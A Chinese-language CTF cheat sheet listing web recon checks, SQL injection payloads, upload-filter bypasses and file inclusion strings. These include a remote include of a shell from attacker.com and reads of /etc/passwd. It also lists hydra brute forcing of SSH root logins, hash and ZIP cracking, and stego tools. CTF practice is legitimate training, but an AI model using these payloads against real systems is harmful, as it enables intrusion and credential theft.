# CTF 快速参考卡

## Web 快速检查
```
1. Ctrl+U 看源码
2. curl -I URL 看响应头
3. URL/.git/HEAD
4. URL/robots.txt
5. URL/.env
6. URL/www.zip / backup.zip
7. JS文件里找API/密钥
8. 参数FUZZ: ffuf -u URL/FUZZ -w wordlist
```

## SQL注入速查
```
检测: ' OR 1=1-- / " OR 1=1--
联合: -1 UNION SELECT 1,2,3--
报错: ' AND extractvalue(1,concat(0x7e,(SELECT database())))--
盲注: ' AND SLEEP(5)--
工具: sqlmap -u URL --batch --dbs
```

## 文件上传绕过
```
后缀: .php3 .php5 .phtml .phar
头: Content-Type: image/jpeg
内容: GIF89a
双重: shell.php.jpg
配置: .htaccess / .user.ini
```

## 文件包含
```
本地: ?page=../../../../etc/passwd
PHP: ?page=php://filter/convert.base64-encode/resource=index.php
远程: ?page=http://attacker.com/shell.txt
```

## 密码破解
```
ZIP: fcrackzip -b -c a -l 1-6 file.zip
     john zip.hash --wordlist=rockyou.txt
Hash: hashcat -a 0 -m 0 hash.txt wordlist (MD5)
SSH: hydra -l root -P passlist ssh://target
```

## 图片隐写
```
基础: file image && strings image && exiftool image
PNG: pngcheck image.png
LSB: stegsolve / zsteg
隐写: steghide extract -sf image.jpg
```

## 常见编码
```
Base64: echo "dGV4dA==" | base64 -d
Hex: echo "74657874" | xxd -r -p
ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

## Flag格式
```
flag{xxx} / ctf{xxx} / FLAG{xxx} / flag-xxx
```

## 常用脚本
```
./ctf-web-recon.sh URL        # Web侦察
./ctf-sqli-test.sh URL param  # SQLi检测
./ctf-crack.sh hash file      # Hash破解
./ctf-crack.sh zip file       # ZIP破解
./ctf-misc-analyze.sh file    # Misc分析
python3 ctf-crypto.py base64 "SGVsbG8="  # Crypto解密
```
